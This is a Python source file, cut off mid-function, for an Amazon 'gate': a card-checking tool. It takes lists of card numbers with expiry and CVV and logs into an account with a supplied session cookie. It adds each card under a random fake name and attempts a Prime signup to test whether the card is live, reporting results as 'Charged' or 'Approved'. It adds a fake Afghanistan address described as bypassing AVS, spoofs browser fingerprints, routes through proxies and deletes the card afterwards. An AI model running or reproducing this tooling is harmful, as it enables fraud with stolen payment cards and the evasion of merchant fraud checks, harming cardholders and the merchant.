from curl_cffi import requests as curl
import re, random, json, time, os, sys, uuid
from urllib.parse import quote_plus, unquote
import html as html_lib

try:
    sys.stdout.reconfigure(encoding='utf-8')
except Exception:
    pass


#//! --------------------------------- Amazon Gate (US / CA / MX / ES / FR / BR / IT) --------------------------------- !\\#
class AmazonGate:

    COUNTRY   = {'US': {'code': 'main',  'cur': 'USD', 'lc': 'lc-main',  'lcv': 'en_US', 'dom': 'amazon.com'},
                  'MX': {'code': 'acbmx', 'cur': 'MXN', 'lc': 'lc-acbmx', 'lcv': 'es_MX', 'dom': 'amazon.com.mx'},
                  'CA': {'code': 'acbca', 'cur': 'CAD', 'lc': 'lc-acbca', 'lcv': 'en_CA', 'dom': 'amazon.ca'},
                  'ES': {'code': 'acbes', 'cur': 'EUR', 'lc': 'lc-acbes', 'lcv': 'es_ES', 'dom': 'amazon.es'},
                  'FR': {'code': 'acbfr', 'cur': 'EUR', 'lc': 'lc-acbfr', 'lcv': 'fr_FR', 'dom': 'amazon.fr'},
                  'BR': {'code': 'acbbr', 'cur': 'BRL', 'lc': 'lc-acbbr', 'lcv': 'pt_BR', 'dom': 'amazon.com.br'},
                  'IT': {'code': 'acbit', 'cur': 'EUR', 'lc': 'lc-acbit', 'lcv': 'it_IT', 'dom': 'amazon.it'}}
    PRIME     = {'US': {'cid': 'SlashPrime', 'iid': 'PrimeDefault',   'lid': 'prime_confirm'},
                  'MX': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultMX', 'lid': 'prime_confirm'},
                  'CA': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultCA', 'lid': 'prime_confirm'},
                  'ES': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultES', 'lid': 'prime_confirm'},
                  'FR': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultFR', 'lid': 'prime_confirm'},
                  'BR': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultBR', 'lid': 'prime_confirm'},
                  'IT': {'cid': 'SlashPrime', 'iid': 'PrimeDefaultIT', 'lid': 'prime_confirm'}}
    ALL_CODES = ['main', 'acbes', 'acbmx', 'acbit', 'acbde', 'acbbr', 'acbae', 'acbsg', 'acbsa', 'acbca', 'acbpl', 'acbau', 'acbjp', 'acbfr', 'acbin', 'acbnl', 'acbuk', 'acbtr', 'acbuc']
    FIRST     = ['James', 'Robert', 'John', 'Michael', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Donald']
    LAST      = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Wilson', 'Anderson', 'Thomas']
    EXPIRED   = 'Cookie expired'
    TIMEOUT   = 25
    IMPERSONATE = 'chrome124'
    FALLBACK_WII = 'GjfJ82o8aZ5P'
    UA_DESKTOP = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36'
    UA_MOBILE  = 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36'

    #//! ---- Static Helpers ---- !\\#
    @staticmethod
    def parseCard(t):
        """Acepta 'num|mm|yy|cvv', 'num|mm|yyyy|cvv', con separadores | / ; :. Valida digitos."""
        if not t:
            return None
        t = t.strip()
        # Separador principal: | ; : / (NO espacio, para no romper numeros con espacios)
        p = re.split(r'\s*[|/;:]\s*', t)
        if len(p) < 4:
            # Fallback: espacios, ej "4111111111111111 12 29 123"
            p = t.split()
        if len(p) < 4:
            return None
        number = re.sub(r'\D', '', p[0])
        month  = re.sub(r'\D', '', p[1]).zfill(2)
        year   = re.sub(r'\D', '', p[2])
        cvv    = re.sub(r'\D', '', p[3])
        if len(year) == 2:
            year = '20' + year
        if not (13 <= len(number) <= 19 and month.isdigit() and 1 <= int(month or 0) <= 12
                and len(year) == 4 and year.startswith('20') and 3 <= len(cvv) <= 4):
            return None
        return {'number': number, 'month': month, 'year': year, 'cvv': cvv}

    @staticmethod
    def cap(text, s, e):
        try:
            if not isinstance(text, str) or not s or not e:
                return ''
            return text.split(s, 1)[1].split(e, 1)[0]
        except Exception:
            return ''

    @staticmethod
    def fakeName():
        return f'{random.choice(AmazonGate.FIRST)} {random.choice(AmazonGate.LAST)}'

    @staticmethod
    def normalizeProxy(proxy):
        if not proxy:
            return None
        proxy = proxy.strip().strip('"').strip("'")
        if not proxy or proxy.startswith('#'):
            return None
        if '://' not in proxy:
            proxy = 'http://' + proxy
        return proxy

    @staticmethod
    def buildCookie(cookie):
        m = re.search(r'\b(main|acb[a-z]{2})\b', cookie, re.I)
        if not m:
            return {'ok': False, 'msg': 'Region code not found.'}
        rc = m.group(1).lower()
        by_code = {v['code']: (k, v) for k, v in AmazonGate.COUNTRY.items()}
        if rc not in by_code:
            return {'ok': False, 'msg': f'Unsupported region: {rc}'}
        cc, info = by_code[rc]
        for c in AmazonGate.ALL_CODES:
            cookie = cookie.replace(c, info['code'])
        cookie = re.sub(r'(i18n-prefs=)[A-Z]{3}', r'\1' + info['cur'], cookie)
        cookie = re.sub(rf'({re.escape(info["lc"])}=)[^;]+', r'\1' + info['lcv'], cookie)
        return {'ok': True, 'cookie': cookie, 'domain': info['dom'], 'cc': cc}

    @staticmethod
    def cookieJar(session, cookie, domain):
        for pair in cookie.split(';'):
            if '=' not in pair:
                continue
            k, v = pair.split('=', 1)
            k, v = k.strip(), v.strip()
            if not k or k.lower() in ('expires', 'path', 'domain', 'max-age', 'samesite', 'secure', 'httponly'):
                continue
            if len(v) >= 2 and v[0] == v[-1] and v[0] in '"\'':
                v = v[1:-1]
            try:
                session.cookies.set(k, v, domain=domain, path='/')
            except Exception:
                continue
        return session

    @staticmethod
    def nextData(html):
        m = re.search(r'<script id="__NEXT_DATA__" type="application/json">(.*?)</script>', html or '', re.S)
        if not m:
            return None
        try:
            return json.loads(m.group(1))
        except Exception:
            try:
                return json.loads(html_lib.unescape(m.group(1)))
            except Exception:
                return None

    @staticmethod
    def buildResult(html, card, cc, url=''):
        cs   = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
        base = {'status': True, 'card': cs, 'card_response': '', 'gateway': f'Amazon ({cc})', 'Powered by': 'Sxgitario @ Gateway Api Service'}
        html = html if isinstance(html, str) else ''

        #//! 1) actionResult in URL
        if url and 'actionResult=' in url:
            try:
                ar  = json.loads(unquote(unquote(url.split('actionResult=', 1)[1].split('&')[0])))
                err = ar.get('errorType', '')
                if ar.get('success') == 1:
                    return {**base, 'success': True,  'response': 'Charged! Prime activated.', 'apiResponse': 'Approved'}
                if err in ('CustomerValidationFailureException', 'HARDVET_VERIFICATION_FAILED', 'PaymentValidationException'):
                    return {**base, 'success': False, 'response': 'Card verification failed.', 'apiResponse': 'Declined'}
                if err in ('InsufficientFundsException', 'PaymentDeclinedException'):
                    return {**base, 'success': True,  'response': 'Charged - Insufficient funds.', 'apiResponse': 'Approved'}
                if err == 'BILLING_ADDRESS_RESTRICTED':
                    return {**base, 'success': True,  'response': 'Charged! Prime activated.', 'apiResponse': 'Approved'}
                if err:
                    return {**base, 'success': False, 'response': f'Amazon error: {err}', 'apiResponse': 'Declined'}
            except Exception:
                pass

        #//! 2) Rate limit / throttle
        if not html or len(html) < 200 or 'Request was throttled' in html or 'Please wait a moment and refresh' in html or 'Too many requests' in html:
            return {**base, 'status': False, 'success': False, 'response': AmazonGate.EXPIRED, 'apiResponse': 'Session Error'}

        #//! 3) HTML keywords (needles pre-lowercased)
        RULES = [
            ('fallbackmessage',                                              True,  'Card successfully linked.'),
            ('\u2019re sorry. we\u2019re unable to complete your prime signup', True, 'Card successfully linked.'),
            ("we're sorry. we're unable to complete your prime signup",       True,  'Card successfully linked.'),
            ('lo lamentamos. no podemos completar tu registro en prime',     True,  'Card successfully linked.'),
            ('payment method was declined',                                  True,  'Charged - Insufficient funds.'),
            ('your payment was declined',                                    True,  'Charged - Insufficient funds.'),
            ('payment was declined',                                         True,  'Charged - Insufficient funds.'),
            ('unable to charge',                                             True,  'Charged - Insufficient funds.'),
            ('insufficient funds',                                           True,  'Charged - Insufficient funds.'),
            ('welcome to prime',                                             True,  'Charged! Prime activated.'),
            ('bienvenido a prime',                                           True,  'Charged! Prime activated.'),
            ('thank you for joining prime',                                  True,  'Charged! Prime activated.'),
            ('congratulations',                                              True,  'Charged! Prime activated.'),
            ('all your prime benefits, in one place',                        True,  'Charged! Prime activated.'),
            ('hardvet_verification_failed',                                  False, 'Card verification failed.'),
            ('customervalidationfailureexception',                           False, 'Card verification failed.'),
            ('paymentvalidationexception',                                   False, 'Card verification failed.'),
            ('an error occurred during the sign up process',                 False, 'Card verification failed.'),
            ('exceeded the maximum attempts allowed',                        False, 'Card verification failed.'),
            ('ha superado el n\u00famero m\u00e1ximo de intentos',            False, 'Card verification failed.'),
            ('enjoy 7 days of prime for just $1.99',                         True,  'Charged! Prime activated ($1.99 Offer).'),
        ]
        hl = html.lower()
        for needle, ok, msg in RULES:
            if needle in hl:
                return {**base, 'success': ok, 'response': msg, 'apiResponse': 'Approved' if ok else 'Declined'}

        return {**base, 'status': False, 'success': False, 'response': 'Unknown response.', 'apiResponse': 'Error'}


    #//! --------------------------------- Constructor --------------------------------- !\\#
    def __init__(self, cookie, proxy=None):
        self.rawCookie = cookie or ''
        self.proxyUrl  = self.normalizeProxy(proxy)
        self.proxies   = {'http': self.proxyUrl, 'https': self.proxyUrl} if self.proxyUrl else {}
        self.csrf = None
        self.addrId = None
        self.s = None
        self.domain = None
        self.cc = None
        self.prime = None
        self.card = None
        self.baseCookie = None
        self._ready = False

    def close(self):
        for sess in (getattr(self, 's', None), getattr(self, '_nat_s', None)):
            try:
                if sess is not None:
                    sess.close()
            except Exception:
                pass
        self.s = None
        self._nat_s = None

    def _new_session(self, cookie, domain, impersonate=None):
        s = curl.Session(impersonate=impersonate or self.IMPERSONATE)
        if self.proxies:
            s.proxies = dict(self.proxies)
        s.allow_redirects = True
        s.headers.update({'Connection': 'keep-alive'})
        return self.cookieJar(s, cookie, domain)

    def _fail(self, msg):
        """Respuesta de error con schema unificado."""
        cs = ''
        if isinstance(self.card, dict):
            cs = f"{self.card.get('number','')}|{self.card.get('month','')}|{self.card.get('year','')}|{self.card.get('cvv','')}"
        return {'status': True, 'success': False, 'card': cs, 'card_response': '',
                'gateway': f'Amazon ({self.cc or "?"})', 'Powered by': 'Sxgitario @ Gateway Api Service',
                'response': msg, 'apiResponse': 'Declined' if 'verification' in msg.lower() or 'invalid card' in msg.lower() else 'Session Error',
                'message': msg}


    #//! --------------------------------- Init Session (R1 + R2 + Address) --------------------------------- !\\#
    def init(self):
        self.close()
        cd = self.buildCookie(self.rawCookie)
        if not cd['ok']:
            return cd
        self.domain, self.cc = cd['domain'], cd['cc']
        self.prime = self.PRIME.get(self.cc, self.PRIME['US'])
        self.baseCookie = cd['cookie']
        try:
            self.s = self._new_session(cd['cookie'], self.domain)
        except Exception:
            return {'ok': False, 'msg': 'Connection failed'}

        lv   = self.COUNTRY[self.cc]['lcv']
        lang = lv.replace('_', '-') + ',' + lv.split('_')[0] + ';q=0.9,en;q=0.8'

        #//! R1 — Homepage
        try:
            r1 = self.s.get(
                f'https://www.{self.domain}/ax/account/manage?openid.return_to=https%3A%2F%2Fwww.{self.domain}%2Fyour-account&openid.assoc_handle={self.cc}flex&shouldShowPasskeyLink=true',
                headers={'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                         'X-Requested-With': 'com.amazon.mShop.android.shopping', 'Accept-Language': lang},
                timeout=self.TIMEOUT).text
        except Exception:
            self.close()
            return {'ok': False, 'msg': 'Connection failed'}

        if "Sorry, your passkey isn't working." in r1:
            self.close()
            return {'ok': False, 'msg': self.EXPIRED}

        #//! R2 — CSRF Token
        try:
            r2 = self.s.get(
                f'https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
                headers={'Upgrade-Insecure-Requests': '1', 'User-Agent': self.UA_MOBILE,
                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                         'X-Requested-With': 'com.amazon.dee.app'},
                timeout=self.TIMEOUT).text
        except Exception:
            self.close()
            return {'ok': False, 'msg': 'Connection failed'}
        self.csrf = self.cap(r2, 'csrfToken = "', '"')
        if not self.csrf:
            self.close()
            return {'ok': False, 'msg': self.EXPIRED}

        #//! Address setup — check existing, add AF if missing, fallback retry
        try:
            self.addrId = self._getBillingId()
            if not self.addrId:
                self.addrId = self._addBilling()
            if not self.addrId:
                time.sleep(1)
                self.addrId = self._getBillingId()
        except Exception:
            self.close()
            return {'ok': False, 'msg': 'Connection failed'}
        if not self.addrId:
            self.close()
            return {'ok': False, 'msg': self.EXPIRED + ' (No Billing Address)'}

        self._ready = True
        return {'ok': True}


    #//! --------------------------------- Process Card (R3 → R13) --------------------------------- !\\#
    def process(self, cardStr):
        if not self._ready or self.s is None:
            return {'success': False, 'message': self.EXPIRED}
        self.card = self.parseCard(cardStr)
        if not self.card:
            return {'success': False, 'message': 'Invalid card format.'}
        d, p = self.domain, self.prime
        ajax = {'Accept': 'application/json, text/plain, */*', 'User-Agent': self.UA_MOBILE, 'client': 'MYXSettings',
                'Content-Type': 'application/x-www-form-urlencoded', 'Origin': f'https://www.{d}',
                'X-Requested-With': 'com.amazon.dee.app',
                'Referer': f'https://www.{d}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca'}
        nm = self.fakeName()

        try:
            #//! R3 — Add Card (dict => encoding correcto de csrf/nombre)
            r3 = self.s.post(
                f'https://www.{d}/hz/mycd/ajax', headers=ajax, timeout=self.TIMEOUT,
                data={'data': json.dumps({"param": {"AddPaymentInstr": {
                    "cc_CardHolderName": nm,
                    "cc_ExpirationMonth": int(self.card["month"]),
                    "cc_ExpirationYear": self.card["year"]}}}, separators=(',', ':')),
                    'csrfToken': self.csrf,
                    'addCreditCardNumber': self.card["number"]}).text
            pid = self.cap(r3, '"paymentInstrumentId":"', '"')
            if not pid:
                return self._fail(self.EXPIRED + ' (Card Add Failed)')

            #//! R5 — Set Payment
            r5 = self.s.post(
                f'https://www.{d}/hz/mycd/ajax', headers=ajax, timeout=self.TIMEOUT,
                data={'data': json.dumps({"param": {"SetOneClickPayment": {
                    "paymentInstrumentId": pid, "billingAddressId": self.addrId,
                    "isBankAccount": False}}}, separators=(',', ':')),
                    'csrfToken': self.csrf}).text
            if '"success":true' not in r5:
                return self._fail(self.EXPIRED + ' (Set Payment Failed)')

            #//! R6 — Wallet (solo valida que la sesion siga viva; R8 usa su propio serializedState)
            r6 = self.s.get(
                f'https://www.{d}/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
                headers={'Host': f'www.{d}', 'Upgrade-Insecure-Requests': '1',
                         'User-Agent': 'Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
                         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                         'X-Requested-With': 'com.amazon.mShop.android.shopping'},
                timeout=self.TIMEOUT).text
            wst = self.cap(r6, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"', '"')
            if not wst and '"clientId":"YA:MPO"' not in r6 and 'manageWalletRequest' not in r6:
                return self._fail(self.EXPIRED + ' (Widget Failed)')

            #//! --- Prime signup en pais nativo (misma sesion base ya normalizada) ---
            nat_dom = self.domain
            self._nat_s = self._new_session(self.baseCookie, nat_dom)
            nat_s = self._nat_s

            #//! R8 — Prime membersignup GET
            _crd   = str(uuid.uuid4()) + '_' + str(uuid.uuid4())
            _p     = self.prime
            _chhdr = {
                'Upgrade-Insecure-Requests': '1', 'User-Agent': self.UA_DESKTOP,
                'device-memory': '16', 'downlink': '10', 'dpr': '1', 'ect': '4g', 'rtt': '50',
                'sec-ch-device-memory': '16', 'sec-ch-dpr': '1',
                'sec-ch-ua': '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
                'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Google Chrome";v="151.0.7922.138", "Chromium";v="151.0.7922.138"',
                'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"19.0.0"',
                'sec-ch-viewport-width': '1234', 'viewport-width': '1234',
            }
            r8 = nat_s.get(f'https://www.{nat_dom}/gp/prime/pipeline/membersignup',
                           params={'campaignId': _p['cid'], 'redirectURL': 'L2dwL3ByaW1l',
                                   'locationID': _p['lid'], 'cancelRedirectURL': 'Lw',
                                   'containerRequestId': _crd, 'originalContainerRequestId': _crd,
                                   'primeSignupFulfillmentType': 'AMAZON_WALLET'},
                           headers=_chhdr, timeout=self.TIMEOUT)
            r8t = r8.text

            _Q1  = ' &amp;quot;'
            _Q2  = '&amp;quot;'
            at2      = self.cap(r8t, 'serializedState' + _Q2 + ':' + _Q2, _Q2).strip()
            if not at2:
                at2 = self.cap(r8t, 'serializedState' + _Q1 + ':' + _Q2, _Q2).strip()
            cId      = self.cap(r8t, 'customerId: "', '"').strip()
            sId      = self.cap(r8t, "ue_sid = '", "'").strip()
            wii      = self.cap(r8t, 'widgetInstanceId' + _Q2 + ':' + _Q2, _Q2).strip()
            if not wii:
                wii = self.cap(r8t, 'widgetInstanceId' + _Q1 + ':' + _Q2, _Q2).strip() or self.FALLBACK_WII
            new_crid = self.cap(r8t, 'containerRequestId' + _Q2 + ':' + _Q2, _Q2).strip()
            if not new_crid:
                new_crid = self.cap(r8t, 'containerRequestId' + _Q1 + ':' + _Q2, _Q2).strip() or _crd
            hvCsrf   = self.cap(r8t, 'wlp-hardvet-csrf-token" content="', '"').strip()
            offerTok = self.cap(r8t, 'name=&quot;offerToken&quot; value=&quot;', '&quot;')
            if not offerTok:
                offerTok = self.cap(r8t, 'name=&amp;quot;offerToken&amp;quot; value=&amp;quot;', '&amp;quot;')
            if not offerTok:
                # offerToken puede ser el ultimo param (sin & final)
                m = re.search(r'offerToken=([^&\s"\']+)', str(r8.url))
                if m:
                    offerTok = m.group(1)

            if not at2:
                if '&amp;quot;' in r8t:
                    at2 = self.cap(r8t, 'Subs:Prime&amp;quot;,&amp;quot;serializedState&amp;quot;:&amp;quot;', '&amp;quot;')
                    if not sId:
                        sId = self.cap(r8t, 'Subs:Prime&amp;quot;,&amp;quot;session&amp;quot;:&amp;quot;', '&amp;quot')
                    if not cId:
                        cId = self.cap(r8t, 'quot;customerId&amp;quot;:&amp;quot;', '&amp;quot')
                else:
                    at2 = self.cap(r8t, 'Subs:Prime&quot;,&quot;serializedState&quot;:&quot;', '&')
                    if not sId:
                        sId = self.cap(r8t, 'Subs:Prime&quot;,&quot;session&quot;:&quot;', '&')
                    if not cId:
                        cId = self.cap(r8t, 'customerId&quot;:&quot;', '&')
            if not at2:
                return self._fail(self.EXPIRED + ' (Prime Init Failed)')
            if not cId:
                cId = self.cap(r8t, '"customerId":"', '"')
            if not sId:
                sId = self.cap(self.rawCookie, 'session-id=', ';')

            #//! R9 — ShowPreferencePaymentOptionListEvent
            _whdr = {
                'Host': f'www.{nat_dom}',
                'X-Requested-With': 'XMLHttpRequest',
                'apx-widget-info': f'Subs:Prime/desktop/{wii}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'priority': 'u=1, i',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'widget-ajax-attempt-count': '0',
            }
            ev_show = json.dumps({"instrumentId": [pid], "instrumentIds": [pid]}, separators=(',', ':'))
            r9 = nat_s.post(f'https://www.{nat_dom}/payments-portal/data/widgets2/v1/customer/{cId}/continueWidget',
                            headers=_whdr, timeout=self.TIMEOUT,
                            data={f'ppw-widgetEvent:ShowPreferencePaymentOptionListEvent:{ev_show}': 'change',
                                  'ppw-jsEnabled': 'true', 'ppw-widgetState': at2, 'ie': 'UTF-8'}).text
            at3 = self.cap(r9, 'hidden\\" name=\\"ppw-widgetState\\" value=\\"', '\\"')
            if not at3:
                at3 = self.cap(r9, 'ppw-widgetState" value="', '"') or self.cap(r9, 'ppw-widgetState\\" value=\\"', '\\"')
            at4 = self.cap(r9, 'data-instrument-id=\\"', '\\"') or self.cap(r9, 'data-instrument-id="', '"')
            if not at3:
                return self._fail(self.EXPIRED + ' (Auth3 Failed)')

            #//! R10 — PreferencePaymentOptionSelectionEvent
            r10 = nat_s.post(f'https://www.{nat_dom}/payments-portal/data/widgets2/v1/customer/{cId}/continueWidget',
                             headers={**_whdr, 'widget-ajax-attempt-count': '1'}, timeout=self.TIMEOUT,
                             data={'ppw-widgetEvent:PreferencePaymentOptionSelectionEvent': '',
                                   'ppw-jsEnabled': 'true', 'ppw-widgetState': at3, 'ie': 'UTF-8',
                                   f'ppw-{at4}_instrumentOrderTotalBalance': '{}',
                                   'ppw-instrumentRowSelection': f'instrumentId={pid}&isExpired=false&paymentMethod=CC&tfxEligible=false',
                                   f'ppw-{pid}_instrumentOrderTotalBalance': '{}'}).text
            wid = self.cap(r10, 'hidden\\" name=\\"ppw-widgetState\\" value=\\"', '\\"')
            if not wid:
                wid = self.cap(r10, 'ppw-widgetState" value="', '"')
            if not wid:
                return self._fail(self.EXPIRED + ' (WalletID Failed)')

            #//! R11 — SavePaymentPreferenceEvent
            r11 = nat_s.post(f'https://www.{nat_dom}/payments-portal/data/widgets2/v1/customer/{cId}/continueWidget',
                             headers={**_whdr, 'widget-ajax-attempt-count': '2'}, timeout=self.TIMEOUT,
                             data={'ppw-jsEnabled': 'true', 'ppw-widgetState': wid,
                                   'ppw-widgetEvent': 'SavePaymentPreferenceEvent'}).text
            wid2   = self.cap(r11, 'preferencePaymentMethodIds":"[\\"', '\\"')
            prefId = self.cap(r11, '"preferenceId":"', '"')
            try:
                _r11j    = json.loads(r11)
                _pmraw   = _r11j['additionalWidgetResponseData']['additionalData'].get('preferencePaymentMethodIds', '[]')
                _pmIds   = json.loads(_pmraw)
                pmIdList = ','.join(_pmIds)
                if not wid2 and _pmIds:
                    wid2 = _pmIds[0]
            except Exception:
                pmIdList = wid2
            if not wid2:
                return self._fail(self.EXPIRED + ' (WalletSave Failed)')

            #//! R13 — HardVet via /mcp/pipeline/transition
            _r13p = {
                'redirectURL':                          'L2dwL3ByaW1l',
                'ExternalCommerce.GoogleTransactionToken': '',
                'successUrl':                           '/hp/wlp/pipeline/actions',
                'ExternalCommerce.AppId':               '',
                'paymentsPortalPreferenceType':         'PRIME',
                'isEligibleForAlexaPlus':               'false',
                'failureUrl':                           '/gp/prime/pipeline/membersignup',
                'inline':                               '0',
                'paymentsPortalExternalReferenceID':    'prime',
                'wlpLocation':                          _p['lid'],
                'paymentMethodId':                      wid2,
                'locationID':                           _p['lid'],
                'namespace':                            'PRIME',
                'actionPageDefinitionId':               'WLPAction_AcceptOffer_HardVet',
                'cancelRedirectURL':                    'Lw',
                'location':                             _p['lid'],
                'originalContainerRequestId':           _crd,
                'session-id':                           sId,
                'paymentMethodIdList':                  pmIdList,
                'containerRequestId':                   new_crid,
                'authenticationSourceClientReference':  new_crid,
                'deviceType':                           'desktop',
                'deviceEnvironment':                    'BROWSER',
                'clientId':                             'prime',
                'locationId':                           'wlp',
                'countryCode':                          self.cc,
                'paymentClass':                         'FreeTrial',
                'planDurationUnit':                     'Monthly',
            }
            if offerTok:
                _r13p['offerToken'] = offerTok
            if hvCsrf:
                _r13p['hardVetCsrfToken'] = hvCsrf
            if prefId:
                _r13p['preferenceId'] = prefId

            r13 = nat_s.get(f'https://www.{nat_dom}/mcp/pipeline/transition',
                            params=_r13p, timeout=self.TIMEOUT,
                            headers={**_chhdr,
                                     'Referer': f'https://www.{nat_dom}/gp/prime/pipeline/membersignup?campaignId={_p["cid"]}&redirectURL=L2dwL3ByaW1l&locationID={_p["lid"]}&cancelRedirectURL=Lw'})

            result = self.buildResult(r13.text, self.card, self.cc, str(r13.url))
        except Exception as e:
            return self._fail(f'Connection failed ({type(e).__name__})')
        finally:
            #//! Delete card from wallet after check (best-effort, no rompe el resultado)
            try:
                self._deleteCard()
            except Exception:
                pass
            try:
                if getattr(self, '_nat_s', None) is not None:
                    self._nat_s.close()
            except Exception:
                pass
            self._nat_s = None

        return result

    #//! --------------------------------- Billing --------------------------------- !\\#
    def _getBillingId(self):
        r = self.s.post(
            f'https://www.{self.domain}/hz/mycd/ajax',
            headers={'Accept': 'application/json, text/plain, */*', 'User-Agent': self.UA_MOBILE, 'client': 'MYXSettings',
                     'Content-Type': 'application/x-www-form-urlencoded', 'Origin': f'https://www.{self.domain}',
                     'X-Requested-With': 'com.amazon.dee.app',
                     'Referer': f'https://www.{self.domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca'},
            timeout=self.TIMEOUT,
            data={'data': json.dumps({"param": {"LogPageInfo": {"pageInfo": {"subPageType": "kinw_total_myk_stb_Perr_paymnt_dlg_cl"}},
                                            "GetAllAddresses": {}}}, separators=(',', ':')),
                  'csrfToken': self.csrf}).text
        return self.cap(r, 'AddressId":"', '"')

    def _addBilling(self):
        """Add Afghanistan/Kabul address (bypasses AVS on all marketplaces). Returns addressId or None."""
        d, nm = self.domain, self.fakeName()
        ph = '7' + str(random.randint(10000000, 99999999))
        try:
            r1 = self.s.get(f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_button',
                            headers={'User-Agent': self.UA_DESKTOP}, timeout=self.TIMEOUT).text
        except Exception:
            return None
        csrf = self.cap(r1, "type='hidden' name='csrfToken' value='", "'") or self.cap(r1, 'name="csrfToken" value="', '"')
        if not csrf:
            return None
        payload = {
            'csrfToken': csrf,
            'address-ui-widgets-countryCode': 'AF',
            'address-ui-widgets-enterAddressFullName': nm,
            'address-ui-widgets-enterAddressPhoneNumber': ph,
            'address-ui-widgets-enterAddressLine1': 'Street 1',
            'address-ui-widgets-enterAddressCity': 'Kabul',
            'address-ui-widgets-enterAddressStateOrRegion': 'Kabul',
            'address-ui-widgets-enterAddressPostalCode': '1001',
        }
        for src_key, dst_key in (('name="address-ui-widgets-previous-address-form-state-token" value="', 'address-ui-widgets-previous-address-form-state-token'),
                                 ('name="address-ui-widgets-csrfToken" value="', 'address-ui-widgets-csrfToken'),
                                 ('name="address-ui-widgets-form-config" value="', 'address-ui-widgets-form-config'),
                                 ('name="address-ui-widgets-obfuscated-customerId" value="', 'address-ui-widgets-obfuscated-customerId')):
            v = self.cap(r1, src_key, '"')
            if v:
                payload[dst_key] = v
        try:
            r2 = self.s.post(f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_post',
                             headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': self.UA_DESKTOP,
                                      'Origin': f'https://www.{d}', 'Referer': f'https://www.{d}/a/addresses/add?ref=ya_address_book_add_button',
                                      'Upgrade-Insecure-Requests': '1'},
                             data=payload, timeout=self.TIMEOUT)
        except Exception:
            return None
        _pats = [r'ypc-aborder-address-id=([A-Za-z0-9-]+)', r'ya_address_book-id=([A-Za-z0-9-]+)',
                 r'addressId=([A-Za-z0-9-]+)', r'addressID=([A-Za-z0-9-]+)']
        urls = [str(r2.url)]
        try:
            urls += [h.headers.get('Location', '') for h in (getattr(r2, 'history', None) or [])]
        except Exception:
            pass
        for src in urls:
            for p in _pats:
                m = re.search(p, src or '')
                if m and len(m.group(1)) >= 8:
                    return m.group(1)
        body = r2.text if isinstance(getattr(r2, 'text', ''), str) else ''
        for p in _pats:
            m = re.search(p, body)
            if m and len(m.group(1)) >= 8:
                return m.group(1)
        return None


    #//! --------------------------------- Delete Card from Wallet --------------------------------- !\#
    def _deleteCard(self):
        d = self.domain
        try:
            rw = self.s.get(f'https://www.{d}/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo', headers={
                'Upgrade-Insecure-Requests': '1', 'User-Agent': self.UA_DESKTOP,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}, timeout=self.TIMEOUT)
            html = rw.text if isinstance(getattr(rw, 'text', ''), str) else ''
        except Exception:
            return False

        wst  = self.cap(html, '"serializedState":"', '"') or self.cap(html, 'serializedState":"', '"')
        cust = self.cap(html, 'customerId":"', '"')
        wii  = self.cap(html, 'widgetInstanceId":"', '"') or self.FALLBACK_WII
        if not wst or not cust:
            return False

        ppw_iid   = ''
        iid_short = ''
        iid_m = re.findall(r'amzn1\.pm\.wallet\.[A-Za-z0-9_\-\.]+', html)
        if iid_m:
            ppw_iid = iid_m[0]
        iid_s = re.findall(r'0h_PU_CUS_[a-f0-9\-]+', html)
        if iid_s:
            iid_short = iid_s[0]
        is_def = 'true' if '"isDefault":"true"' in html or '"isDefault":true' in html else 'false'
        if not ppw_iid:
            return False

        whdr = {'User-Agent': self.UA_DESKTOP, 'X-Requested-With': 'XMLHttpRequest',
                'apx-widget-info': f'YA:Wallet/desktop/{wii}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': f'https://www.{d}',
                'Referer': f'https://www.{d}/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
